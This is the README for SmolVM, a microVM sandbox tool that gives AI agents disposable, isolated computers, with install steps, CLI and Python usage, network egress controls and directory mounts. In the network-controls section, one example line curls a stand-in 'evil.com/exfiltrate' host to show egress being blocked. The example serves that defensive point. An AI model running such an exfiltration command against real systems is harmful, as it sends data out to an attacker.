<div align="center">

# SmolVM

#### Secure, isolated computers that AI agents can use to browse, run code, and get real work done. 


<img src="https://ik.imagekit.io/gradsflow/celestoai/logo/celesto%20cover%20low_vFigbRaJI.png">

[![CodeQL](https://github.com/CelestoAI/SmolVM/actions/workflows/github-code-scanning/codeql/badge.svg)](https://github.com/CelestoAI/SmolVM/actions/workflows/github-code-scanning/codeql)
[![Run Tests](https://github.com/CelestoAI/SmolVM/actions/workflows/pytest.yml/badge.svg)](https://github.com/CelestoAI/SmolVM/actions/workflows/pytest.yml)
[![License](https://img.shields.io/badge/License-Apache_2.0-orange.svg)](https://opensource.org/licenses/Apache-2.0)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-orange.svg)](https://www.python.org/downloads/)

[Quick start](#quickstart) • [Examples](#examples) • [Features](https://docs.celesto.ai/smolvm/features) • [Performance](#performance) • [Docs](https://docs.celesto.ai) • [Community Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q) 

</div>

---

SmolVM gives AI agents their own disposable computer. 
Each microVM boots in milliseconds, runs any code or software you throw at it, persists files and state across sessions, and disappears when you're done — ready to handle thousands of sandboxes in production.

<br>

<table>
<tr>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/zap.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Sub-second boot</strong></p>
<p>Your agent has a running VM before the API call returns (~500&nbsp;ms). No waiting for provisioning or image pulls.</p>
<p><a href="#performance">Read more →</a></p>
</td>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/shield.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Hardware isolation</strong></p>
<p>Each sandbox runs in its own virtual machine with hardware-level separation. Untrusted code can't escape or access your host.</p>
<p><a href="#security">Read more →</a></p>
</td>
</tr>
<tr>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/network.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Network controls</strong></p>
<p>Lock down egress to specific domains so agents can't call home or exfiltrate data.</p>
<p><a href="#network-controls">Read more →</a></p>
</td>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/monitor.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Browser sandbox</strong></p>
<p>Give agents a full browser inside the sandbox. Navigate, click, fill forms, and watch it live in your own browser.</p>
<p><a href="#browser-sandbox">Read more →</a></p>
</td>
</tr>
<tr>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/folder.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>File sharing</strong></p>
<p>Share local directories with the sandbox, read-only or writable. Agents work on your real codebase without copying files around.</p>
<p><a href="#mount-host-directories">Read more →</a></p>
</td>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/camera.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Snapshots</strong></p>
<p>Pause a sandbox and resume it later with everything intact — memory, disk, and running processes.</p>
<p><a href="https://docs.celesto.ai/smolvm/features/snapshots">Read more →</a></p>
</td>
</tr>
<tr>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/bot.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>Coding agents</strong></p>
<p>One command to launch a sandbox with Claude Code, Codex, or Pi pre-installed and git credentials forwarded.</p>
<p><a href="#coding-agents">Read more →</a></p>
</td>
<td width="50%" valign="top">
<p><img src="https://api.iconify.design/lucide/app-window-mac.svg?color=%236e7681" width="24" height="24" align="absmiddle" alt=""> <strong>OpenClaw</strong></p>
<p>Run GUI Linux apps — IDEs, browsers, design tools — inside an isolated sandbox you can stream to your screen.</p>
<p><a href="examples/openclaw.py">See the example →</a></p>
</td>
</tr>
</table>


## Use cases

- **Run untrusted code safely.** Execute AI-generated code in an isolated sandbox instead of on your machine.
- **Give agents a browser.** Spin up a full browser session that agents can see and control in real time.
- **Let agents read your project.** Mount a local directory so agents can explore your codebase inside a sandbox.
- **Keep state across turns.** Reuse the same sandbox throughout a multi-step workflow.


## Quickstart

Install SmolVM with a single command:

```bash
curl -sSL https://celesto.ai/install.sh | bash
```

This installs everything you need (including Python), configures your machine, and verifies the setup.

<details>
<summary>Manual installation</summary>

```bash
pip install smolvm
smolvm setup
smolvm doctor
```

On supported Linux and macOS systems, `pip install smolvm` also pulls in the matching `smolvm-core` wheel automatically. Most users do not need Rust installed.

Linux may prompt for `sudo` during setup so it can install host dependencies and configure runtime permissions.

For golden-AMI builds, two-stage deploys, pinning the Firecracker version, and other non-default install paths, see [docs/installation.md](docs/installation.md).

</details>

### Start a sandbox in Python

```python
from smolvm import SmolVM

vm = SmolVM()
result = vm.run("echo 'Hello from the sandbox!'")
print(result)
vm.stop()
```

### Start a sandbox from the CLI

Create a sandbox, check that it's running, then stop it:

```bash
smolvm create --name my-sandbox
# my-sandbox  running  172.16.0.2

smolvm list
# NAME         STATUS   IP
# my-sandbox   running  172.16.0.2

smolvm stop my-sandbox
```

Open a shell inside a running sandbox:

```bash
smolvm ssh my-sandbox
```

## Coding agents

It sucks to “press enter and accept changes” every few seconds while using coding agents. SmolVM makes it easy to isolate the agent coding environment from the host (laptops).

With a single command you get a claude/codex pre-installed sandbox ready with git credential to make you build a billion dollar business without making any mistake ;)

Video tutorial:

<a href="https://youtu.be/j1qyrTsI0Jw"><img src="https://img.youtube.com/vi/j1qyrTsI0Jw/maxresdefault.jpg" alt="Coding agents in a sandbox" width="480"></a>

```bash
smolvm codex start  # start a new environment with codex preinstalled

smolvm claude start  # start a new environment with claude preinstalled

smolvm pi start  # start a new environment with the Pi coding agent preinstalled
```


## Browser sandbox

SmolVM can also start a full browser inside a sandbox. This is useful when agents need to navigate websites, fill out forms, or take screenshots.

Start a browser session with a live view you can watch in your own browser:

```bash
smolvm browser start --live
# Session:   sess_a1b2c3
# Live view: http://localhost:6080
```

Open the URL to watch the browser in real time. When you're done, list and stop sessions:

```bash
smolvm browser list
smolvm browser stop sess_a1b2c3
```

See [examples/browser_session.py](examples/browser_session.py) for the Python equivalent.


## Network controls

By default, sandboxes have full internet access. You can restrict which domains a sandbox can reach by passing `internet_settings`:

```python
from smolvm import SmolVM

vm = SmolVM(internet_settings={
    "allowed_domains": ["https://api.openai.com"],
})

vm.run("curl https://api.openai.com/v1/models")    # allowed
vm.run("curl https://evil.com/exfiltrate")         # blocked
```

See [docs/concepts/network-egress-controls.md](docs/concepts/network-egress-controls.md) for how it works under the hood.


## Mount host directories

You can give a sandbox access to a folder on your machine. This is useful when an agent needs to work with an existing project without copying files back and forth.

```bash
smolvm create --mount ~/Projects/my-app
smolvm ssh my-sandbox
ls /workspace   # your host files appear here
```

By default the host folder is read-only — the sandbox can read every file, but changes stay inside the sandbox and never touch the originals. If the agent creates or edits files under `/workspace`, those changes live only in the VM's overlay layer.

Mount at a custom path, or mount multiple directories:

```bash
smolvm create --mount ~/Projects/my-app:/code --mount ~/data:/mnt/data
```

When you do want the sandbox to edit your host files, add `--writable-mounts`:

```bash
smolvm create --mount ~/Projects/my-app --writable-mounts
```

Every directory passed with `--mount` becomes writable; writes from the guest are visible on the host immediately. The flag applies to all mounts on that command, so don't pair a folder you want the sandbox to modify with one you want kept untouched.

The same works from Python:

```python
from smolvm import SmolVM

with SmolVM(mounts=["~/Projects/my-app"], writable_mounts=True) as vm:
    vm.run("echo hello > /workspace/from-sandbox.txt")
```

## Upload a file

You can copy one file into a running sandbox without mounting a whole folder.
This is useful when an agent needs a config file, script, or small input file.

```bash
# Copy a file from your machine into the sandbox.
smolvm file upload my-sandbox ./prompt.txt /tmp/prompt.txt

# Open a shell in the sandbox to confirm the file is there.
smolvm ssh my-sandbox
# Then, inside the sandbox shell:
cat /tmp/prompt.txt
```

The same works from Python:

```python
from smolvm import SmolVM

vm = SmolVM.from_id("my-sandbox")
vm.upload_file("./prompt.txt", "/tmp/prompt.txt")
vm.close()
```

The destination must be an absolute path inside the sandbox (starting
with `/`), and any existing file at that path is overwritten.


## Examples

### Getting started

| What you'll learn | Example |
| --- | --- |
| Run code in a sandbox | [quickstart_sandbox.py](examples/quickstart_sandbox.py) |
| Start a browser session | [browser_session.py](examples/browser_session.py) |
| Pass environment variables into a sandbox | [env_injection.py](examples/env_injection.py) |

### Agent framework integrations

These examples show how to wrap SmolVM as a tool for popular agent frameworks, so an AI model can run shell commands or drive a browser through your sandbox.

| Framework | Example |
| --- | --- |
| OpenAI Agents | [openai_agents_tool.py](examples/agent_tools/openai_agents_tool.py) |
| LangChain | [langchain_tool.py](examples/agent_tools/langchain_tool.py) |
| PydanticAI — shell tool | [pydanticai_tool.py](examples/agent_tools/pydanticai_tool.py) |
| PydanticAI — reusable sandbox across turns | [pydanticai_reusable_tool.py](examples/agent_tools/pydanticai_reusable_tool.py) |
| PydanticAI — browser automation | [pydanticai_agent_browser.py](examples/agent_tools/pydanticai_agent_browser.py) |
| Computer use (click and type) | [computer_use_browser.py](examples/agent_tools/computer_use_browser.py) |

### Advanced

| What it does | Example |
| --- | --- |
| Install and run OpenClaw inside a Debian sandbox with a 4 GB root filesystem | [openclaw.py](examples/openclaw.py) |

Each script shows its own `pip install ...` line when it needs extra packages.


## Security

SmolVM automatically trusts new sandboxes on first connection to keep setup simple. This is safe for local development, but you should not expose sandbox network ports publicly without extra controls. See [SECURITY.md](SECURITY.md) for the full policy and scope.


## Performance

SmolVM ships a benchmark suite that measures the timings AI agents actually feel: cold start, time-to-interactive, pause/resume, and snapshot create/restore. It drives the public Python SDK on whichever backend is native to your host — Firecracker on Linux, QEMU on macOS.

Run it locally:

```bash
uv run python scripts/benchmarks/bench.py
```

See [scripts/benchmarks/README.md](scripts/benchmarks/README.md) for flags, output format, and what each metric means.



## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.


## License

Apache 2.0 — see [LICENSE](LICENSE) for details.

---
<div align="center">
Built with 🧡 in London by <a href="https://celesto.ai">Celesto AI</a>
</div>
